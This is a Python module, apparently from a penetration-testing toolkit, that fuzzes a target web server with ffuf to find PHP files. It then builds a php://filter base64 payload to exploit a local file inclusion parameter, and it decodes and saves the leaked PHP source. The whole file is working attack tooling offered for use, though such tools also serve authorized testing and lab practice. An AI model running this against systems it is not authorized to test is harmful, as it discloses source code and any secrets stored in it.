import base64
import textwrap
from pathlib import Path

from core.paths import get_artifacts_dir
import json
import subprocess
from datetime import datetime

from core.paths import get_artifacts_dir
from core.target import get_current_url


PROVIDES = []
REQUIRES = []

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
BOLD = '\033[1m'


# =========================================================
# MAIN
# =========================================================

def run(data, cred, args):

    ip = get_current_url(data)

    if not ip:

        print(
            f"\n{R}[!] No target selected.{W}\n"
        )

        return

    url = input(
        f"{Y}Base URL [{ip}]> {W}"
    ).strip() or ip

    parameter = input(
        f"{Y}LFI Parameter [language]> {W}"
    ).strip() or "language"

    print()
    print(f"{G}[+] Fuzzing for PHP files...{W}\n")
    
    artifact_dir = (
        get_artifacts_dir(data["name"])
        /
        "ffuf"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True,
    )

    ffuf_out = (
        artifact_dir
        /
        f"php_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    )        

    cmd = [
        "ffuf",
        "-w",
        "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ",
        "-u",
        f"{url.rstrip('/')}/FUZZ.php",
        "-mc",
        "200,204,301,302,307,401,403",
        "-of",
        "json",
        "-o",
        str(ffuf_out),
    ]

    print()

    print(
        f"{G}[+] Running{W}\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    subprocess.run(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )




    with open(ffuf_out) as f:

        results = json.load(f)["results"]

    phpfiles = sorted({
        r["input"]["FUZZ"]
        for r in results
        if r["url"].endswith(".php")
    })

    print(
        f"{G}[+] PHP Files{W}\n"
    )

    for i, p in enumerate(phpfiles, 1):

        print(
            f"  {B}[{C}{i}{B}]{W} {p}"
        )

    print()



    choice = input(
        f"{Y}Select PHP File [1]> {W}"
    ).strip()

    if not phpfiles:

        print(
            f"\n{R}[!] No PHP files discovered.{W}\n"
        )

        return

    if not choice:

        phpfile = phpfiles[0]

    elif choice.isdigit():

        idx = int(choice) - 1

        if idx < 0 or idx >= len(phpfiles):

            print(
                f"\n{R}[!] Invalid selection.{W}\n"
            )

            return

        phpfile = phpfiles[idx]

    else:

        phpfile = choice

    if phpfile.endswith(".php"):

        phpfile = phpfile[:-4]

    print()

    print(
        f"{G}[+] PHP Filter Payload{W}\n"
    )

    payload = (
        f"php://filter/read=convert.base64-encode/resource={phpfile}"
    )

    print(f"{C}{payload}{W}")

    print()

    print(
        f"{Y}Paste Base64 output below."
    )
    print(
        f"Finish with Ctrl-D (Linux) or Ctrl-Z then Enter (Windows).\n{W}"
    )

    try:

        encoded = ""

        while True:
            encoded += input()

    except EOFError:

        pass

    encoded = "".join(encoded.split())

    if not encoded:

        print(
            f"\n{R}[!] No Base64 supplied.{W}\n"
        )

        return

    try:

        decoded = base64.b64decode(
            encoded
        ).decode(
            errors="replace"
        )

    except Exception as e:

        print(
            f"\n{R}[!] Failed decoding:{W} {e}\n"
        )

        return

    print()

    print(
        f"{G}[+] Decoded Source{W}\n"
    )

    print(decoded)

    print()

    save = input(
        f"{Y}Save source? [Y]> {W}"
    ).strip().lower()

    if save in ("", "y", "yes"):

        outdir = (
            get_artifacts_dir(
                data["name"]
            )
            /
            "lfi"
        )

        outdir.mkdir(
            parents=True,
            exist_ok=True,
        )

        outfile = (
            outdir
            /
            f"{phpfile}.php"
        )

        outfile.write_text(
            decoded,
            encoding="utf-8"
        )

        print()

        print(
            f"{G}[+] Saved{W}"
        )

        print(
            f"{B}  └── {C}{outfile}{W}\n"
        )

    return
